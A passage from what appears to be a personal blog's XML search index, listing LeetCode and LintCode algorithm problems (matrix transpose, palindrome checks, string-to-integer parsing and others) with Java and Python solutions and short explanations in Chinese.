<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[][] transpose(<span class="keyword">int</span>[][] A) &#123;</span><br><span class="line">    <span class="keyword">int</span> m = A.length, n = A[<span class="number">0</span>].length;</span><br><span class="line">    <span class="keyword">int</span>[][] newA = <span class="keyword">new</span> <span class="keyword">int</span>[n][m];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            newA[j][i] = A[i][j];</span><br><span class="line">    <span class="keyword">return</span> newA;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[132. Palindrome Partitioning II]]></title>
      <url>/wiki/2017/10/10/Leetcode-132-Palindrome-Partitioning-II/</url>
      <content type="html"><![CDATA[<p>Given a string $s$, partition $s$ such that every substring of the partition is a palindrome.</p>
<p>Return the minimum cuts needed for a palindrome partitioning of $s$.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;aab&quot;</span><br><span class="line">Output: 1</span><br><span class="line">Explanation: The palindrome partitioning [&quot;aa&quot;,&quot;b&quot;] could be produced using 1 cut.</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[760. Find Anagram Mappings]]></title>
      <url>/wiki/2017/10/10/Leetcode-760-Find-Anagram-Mappings/</url>
      <content type="html"><![CDATA[<p>Given two lists A and B, and B is an anagram of A. B is an anagram of A means B is made by randomizing the order of the elements in A.</p>
<p>We want to find an index mapping P, from A to B. A mapping P[i] = j means the ith element in A appears in B at index j.</p>
<p>These lists A and B may contain duplicates. If there are multiple answers, output any of them.</p>
<p>Example</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Given A = [12, 28, 46, 32, 50] and B = [50, 12, 32, 46, 28], return [1, 4, 3, 2, 0].</span><br><span class="line"></span><br><span class="line">Explanation:</span><br><span class="line">as P[0] = 1 because the 0th element of A appears at B[1], </span><br><span class="line">and P[1] = 4 because the 1st element of A appears at B[4], and so on.</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>A, B have equal lengths in range [1, 100].</li>
<li>A[i], B[i] are integers in range [0, 10^5].</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目LeetCode收费，没有会员的请前往<a href="https://www.lintcode.com/problem/find-anagram-mappings/description">LintCode</a>。一看到这道题目就会想起LeetCode 205. Isomorphic Strings。在Q205中，确认字符串是否同构的关键步骤是构造一个映射，而这里题目明确指明需要求出这个映射。唯一的区别是，Q205里是字符串，这里是数字。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] anagramMappings(<span class="keyword">int</span>[] A, <span class="keyword">int</span>[] B) &#123;</span><br><span class="line">    <span class="keyword">int</span>[] res = <span class="keyword">new</span> <span class="keyword">int</span>[A.length];</span><br><span class="line">    Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; B.length; i++)</span><br><span class="line">        map.put(B[i], i);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.length; i++)</span><br><span class="line">        res[i] = map.get(A[i]);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Hash Table </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[599. Minimum Index Sum of Two Lists]]></title>
      <url>/wiki/2017/10/10/Leetcode-599-Minimum-Index-Sum-of-Two-Lists/</url>
      <content type="html"><![CDATA[<p>Suppose Andy and Doris want to choose a restaurant for dinner, and they both have a list of favorite restaurants represented by strings.</p>
<p>You need to help them find out their <strong>common interest</strong> with the <strong>least list index sum</strong>. If there is a choice tie between answers, output all of them with no order requirement. You could assume there always exists an answer.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">[&quot;Shogun&quot;, &quot;Tapioca Express&quot;, &quot;Burger King&quot;, &quot;KFC&quot;]</span><br><span class="line">[&quot;Piatti&quot;, &quot;The Grill at Torrey Pines&quot;, &quot;Hungry Hunter Steakhouse&quot;, &quot;Shogun&quot;]</span><br><span class="line">Output: [&quot;Shogun&quot;]</span><br><span class="line">Explanation: The only restaurant they both like is &quot;Shogun&quot;.</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">[&quot;Shogun&quot;, &quot;Tapioca Express&quot;, &quot;Burger King&quot;, &quot;KFC&quot;]</span><br><span class="line">[&quot;KFC&quot;, &quot;Shogun&quot;, &quot;Burger King&quot;]</span><br><span class="line">Output: [&quot;Shogun&quot;]</span><br><span class="line">Explanation: The restaurant they both like and have the least index sum is &quot;Shogun&quot; with index sum 1 (0+1).</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>The length of both lists will be in the range of [1, 1000].</li>
<li>The length of strings in both lists will be in the range of [1, 30].</li>
<li>The index is starting from 0 to the list length minus 1.</li>
<li>No duplicates in both lists.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>考查HashMap的基本操作:<code>map.containsKey()</code>, <code>map.put()</code>, <code>map.get()</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String[] findRestaurant(String[] list1, String[] list2) &#123;</span><br><span class="line">    Map&lt;String, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, min = Integer.MAX_VALUE, cur = <span class="number">0</span>;</span><br><span class="line">    List&lt;String&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (String str: list1)</span><br><span class="line">        map.put(str, i++);</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (String str: list2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(str)) &#123;</span><br><span class="line">            cur = i + map.get(str);</span><br><span class="line">            <span class="keyword">if</span> (cur &lt; min) &#123;</span><br><span class="line">                res.clear();</span><br><span class="line">                res.add(str);</span><br><span class="line">                min = cur;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cur == min) &#123;</span><br><span class="line">                res.add(str);</span><br><span class="line">                min = cur;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125; <span class="comment">// end for</span></span><br><span class="line">    <span class="keyword">return</span> res.toArray(<span class="keyword">new</span> String[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Hash Table </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[9. Palindrome Number]]></title>
      <url>/wiki/2017/10/10/Leetcode-9-Palindrome-Number/</url>
      <content type="html"><![CDATA[<p>Determine whether an integer is a palindrome. Do this without extra space.</p>
<p>click to show spoilers.</p>
<p>Some hints:<br>Could negative integers be palindromes? (ie, -1)</p>
<p>If you are thinking of converting the integer to string, note the restriction of using extra space.</p>
<p>You could also try reversing an integer. However, if you have solved the problem “Reverse Integer”, you know that the reversed integer might overflow. How would you handle such case?</p>
<p>There is a more generic way of solving this problem.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isPalindrome</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> x &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">        r = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> x / r &gt;= <span class="number">10</span>:</span><br><span class="line">            r *= <span class="number">10</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> r &gt; <span class="number">1</span>:</span><br><span class="line">            left, x =divmod(x, r)</span><br><span class="line">            x, right = divmod(x, <span class="number">10</span>)</span><br><span class="line">            <span class="keyword">if</span> left != right:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">            r //= <span class="number">100</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></table></figure>
<p>//符号：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In Python 3</span><br><span class="line">// =&gt; used for integer output</span><br><span class="line">/ =&gt; used for double output</span><br><span class="line"></span><br><span class="line">100/35 =&gt; 2.857142857142857</span><br><span class="line">100//35 =&gt; 2</span><br><span class="line">100.//35 =&gt; 2.0    # floating-point result if divsor or dividend real</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[500. Keyboard Row]]></title>
      <url>/wiki/2017/10/10/Leetcode-500-Keyboard-Row/</url>
      <content type="html"><![CDATA[<p>Given a List of words, return the words that can be typed using letters of <strong>alphabet</strong> on only one row’s of American keyboard like the image below.</p>
<p><img src="http://phpk72ttq.bkt.clouddn.com/15416466676750.png?imageslim" alt=""></p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [&quot;Hello&quot;, &quot;Alaska&quot;, &quot;Dad&quot;, &quot;Peace&quot;]</span><br><span class="line">Output: [&quot;Alaska&quot;, &quot;Dad&quot;]</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ol>
<li>You may use one character in the keyboard more than once.</li>
<li>You may assume the input string will only contain letters of alphabet.</li>
</ol>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>把键盘中的每一个字符都存在哈希表中，第$i$行字符对应数字$i$。依次检查输入的每个字符串，如果字符串的每个字符都对应相同的数字，则加入到结果中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String[] findWords(String[] words) &#123;</span><br><span class="line">    String[] strs = &#123;<span class="string">"QWERTYUIOP"</span>,<span class="string">"ASDFGHJKL"</span>,<span class="string">"ZXCVBNM"</span>&#125;;</span><br><span class="line">    Map&lt;Character, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; strs.length; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> c: strs[i].toCharArray())</span><br><span class="line">            map.put(c, i); <span class="comment">//put &lt;char, rowIndex&gt; pair into the map</span></span><br><span class="line">    </span><br><span class="line">    List&lt;String&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (String w: words)&#123;</span><br><span class="line">        <span class="keyword">if</span> (w.length() == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">        String wUpperCase = w.toUpperCase();</span><br><span class="line">        <span class="keyword">int</span> index = map.get(wUpperCase.charAt(<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> c: wUpperCase.toCharArray())</span><br><span class="line">            <span class="keyword">if</span> (map.get(c) != index)&#123;</span><br><span class="line">                index = -<span class="number">1</span>; <span class="comment">//don't need a boolean flag. </span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">if</span> (index != -<span class="number">1</span>) res.add(w); <span class="comment">//if index != -1, this is a valid string</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.toArray(<span class="keyword">new</span> String[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也可以使用正则表达式和Java8新特性:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String[] findWords(String[] words) &#123;</span><br><span class="line">    <span class="keyword">return</span> Stream</span><br><span class="line">        .of(words)</span><br><span class="line">        .filter(s -&gt; s.toLowerCase().matches(<span class="string">"[qwertyuiop]*|[asdfghjkl]*|[zxcvbnm]*"</span>))</span><br><span class="line">        .toArray(String[]::<span class="keyword">new</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>*</code>表示匹配前面的子表达式零次或多次，<code>|</code>指明两项之间的一个选择，<code>[]</code>定义匹配的字符范围。</p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Hash Table </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[8. String to Integer (atoi)]]></title>
      <url>/wiki/2017/10/10/Leetcode-8-String-to-Integer-atoi/</url>
      <content type="html"><![CDATA[<p>Implement <code>atoi</code> which converts a string to an integer.</p>
<p>The function first discards as many whitespace characters as necessary until the first non-whitespace character is found. Then, starting from this character, takes an optional initial plus or minus sign followed by as many numerical digits as possible, and interprets them as a numerical value.</p>
<p>The string can contain additional characters after those that form the integral number, which are ignored and have no effect on the behavior of this function.</p>
<p>If the first sequence of non-whitespace characters in str is not a valid integral number, or if no such sequence exists because either str is empty or it contains only whitespace characters, no conversion is performed.</p>
<p>If no valid conversion could be performed, a zero value is returned.</p>
<p>Note:</p>
<ul>
<li>Only the space character <code>&#39; &#39;</code> is considered as whitespace character.</li>
<li>Assume we are dealing with an environment which could only store integers within the 32-bit signed integer range: [−$2^{31}$,  $2^{31} − 1$]. If the numerical value is out of the range of representable values, INT_MAX ($2^{31} − 1$) or INT_MIN (−$2^{31}$) is returned.</li>
</ul>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;42&quot;</span><br><span class="line">Output: 42</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;   -42&quot;</span><br><span class="line">Output: -42</span><br><span class="line">Explanation: The first non-whitespace character is &apos;-&apos;, which is the minus sign.</span><br><span class="line">             Then take as many numerical digits as possible, which gets 42.</span><br></pre></td></tr></table></figure>
<p>Example 3:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;4193 with words&quot;</span><br><span class="line">Output: 4193</span><br><span class="line">Explanation: Conversion stops at digit &apos;3&apos; as the next character is not a numerical digit.</span><br></pre></td></tr></table></figure>
<p>Example 4:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;words and 987&quot;</span><br><span class="line">Output: 0</span><br><span class="line">Explanation: The first non-whitespace character is &apos;w&apos;, which is not a numerical </span><br><span class="line">             digit or a +/- sign. Therefore no valid conversion could be performed.</span><br></pre></td></tr></table></figure>
<p>Example 5:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;-91283472332&quot;</span><br><span class="line">Output: -2147483648</span><br><span class="line">Explanation: The number &quot;-91283472332&quot; is out of the range of a 32-bit signed integer.</span><br><span class="line">             Thefore INT_MIN (−231) is returned.</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目其实出的很好，非常具有实际意义。我直接借鉴的Java中的<code>Integer.parseInt()</code>的写法。它具有一下特点:</p>
<ul>
<li>把结果写成负数结果，因为负数的范围比正数大，比较方便。</li>
<li>分别判断减法溢出和乘法溢出。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">myAtoi</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        str = str.trim(); <span class="comment">// 除去空格</span></span><br><span class="line">        <span class="keyword">int</span> len = str.length(); <span class="comment">//数字长度</span></span><br><span class="line">        <span class="keyword">if</span> (len == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 特殊情况：空字符串</span></span><br><span class="line">        <span class="keyword">boolean</span> isPositive = <span class="keyword">true</span>; <span class="comment">// 数字正负符号</span></span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>; <span class="comment">// index</span></span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>; <span class="comment">// 转换结果</span></span><br><span class="line">        <span class="keyword">int</span> limit = -Integer.MAX_VALUE; <span class="comment">// 数字下限：用来判断减法溢出</span></span><br><span class="line">        <span class="comment">// 首字符是(+，-)</span></span><br><span class="line">        <span class="keyword">if</span> (str.charAt(<span class="number">0</span>) == <span class="string">'+'</span> ) &#123;i++;&#125;</span><br><span class="line">        <span class="keyword">if</span> (str.charAt(<span class="number">0</span>) == <span class="string">'-'</span>)  &#123;</span><br><span class="line">            i++;</span><br><span class="line">            isPositive = <span class="keyword">false</span>;</span><br><span class="line">            limit = Integer.MIN_VALUE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> isStart = <span class="keyword">false</span>; <span class="comment">// 数字开头载入了吗？</span></span><br><span class="line">        <span class="keyword">int</span> multmin = limit / <span class="number">10</span>; <span class="comment">// 数字下限：用来判断乘法溢出</span></span><br><span class="line">        <span class="keyword">while</span> (i &lt; len) &#123;</span><br><span class="line">            <span class="keyword">int</span> tail = str.charAt(i) - <span class="string">'0'</span>;</span><br><span class="line">            <span class="comment">// 后续字符都是数字</span></span><br><span class="line">            <span class="keyword">if</span> (tail &gt; <span class="number">9</span> || tail &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!isStart) <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 非有效数字，返回0</span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 乘法溢出</span></span><br><span class="line">            <span class="keyword">if</span> (result &lt; multmin) &#123;</span><br><span class="line">                <span class="keyword">if</span> (isPositive) <span class="keyword">return</span> -limit;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">return</span> limit;</span><br><span class="line">            &#125;</span><br><span class="line">            result *= <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 减法溢出</span></span><br><span class="line">            <span class="keyword">if</span> (result &lt; limit + tail) &#123;</span><br><span class="line">                <span class="keyword">if</span> (isPositive) <span class="keyword">return</span> -limit;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">return</span> limit;</span><br><span class="line">            &#125;</span><br><span class="line">            result -= tail;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            isStart = <span class="keyword">true</span>; <span class="comment">// 已经载入第一个数字</span></span><br><span class="line">            i++; <span class="comment">// 下一个数字</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> isPositive ? -result : result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><p>Python解答：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">myAtoi</span><span class="params">(self, str)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type str: str</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        str_strip = str.strip() <span class="comment"># strip whitespace</span></span><br><span class="line">        <span class="comment"># str is empty or it contians only white space characters, no conversion is performed</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> len(str_strip): <span class="keyword">return</span> <span class="number">0</span> </span><br><span class="line">        first_num = <span class="number">0</span></span><br><span class="line">        first_char = str_strip[<span class="number">0</span>]</span><br><span class="line">        sign = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> first_char == <span class="string">'+'</span>:</span><br><span class="line">            first_num = <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> first_char == <span class="string">'-'</span>:</span><br><span class="line">            sign = <span class="number">-1</span></span><br><span class="line">            first_num = <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># only -,+ character</span></span><br><span class="line">        <span class="keyword">if</span> len(str_strip)==<span class="number">1</span> <span class="keyword">and</span> first_num==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># check the first character of non-whitespace string is a number</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (<span class="string">'0'</span> &lt;= str_strip[first_num] &lt;= <span class="string">'9'</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># remove 0 in the front of the string</span></span><br><span class="line">        print(str_strip[first_num])</span><br><span class="line">        <span class="keyword">while</span> str_strip[first_num] == <span class="string">'0'</span>:</span><br><span class="line">            first_num += <span class="number">1</span></span><br><span class="line">            print(<span class="string">"OK"</span>)</span><br><span class="line">        </span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> str_strip[first_num:]:</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">'0'</span> &lt;= char &lt;= <span class="string">'9'</span>):</span><br><span class="line">                result = result*<span class="number">10</span> +  ord(char) - ord(<span class="string">'0'</span>)</span><br><span class="line">            <span class="comment"># contains illegal character in the end of str</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># sign +, -</span></span><br><span class="line">        result *= sign</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> result &gt; <span class="number">2147483647</span>:</span><br><span class="line">            result = <span class="number">2147483647</span></span><br><span class="line">        <span class="keyword">elif</span> result &lt; <span class="number">-2147483647</span><span class="number">-1</span>:</span><br><span class="line">            result = <span class="number">-2147483647</span><span class="number">-1</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> String </tag>
            
            <tag> Math </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[464. Sort Integers II]]></title>
      <url>/wiki/2017/10/10/LintCode-464-Sort-Integers-II/</url>
      <content type="html"><![CDATA[<p>Given an integer array, sort it in ascending order. Use quick sort, merge sort, heap sort or any $O(nlogn)$ algorithm.</p>
]]></content>
      
        <categories>
            
            <category> LintCode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Quick Sort </tag>
            
            <tag> Sort </tag>
            
            <tag> Merge Sort </tag>
            
        </tags>
        
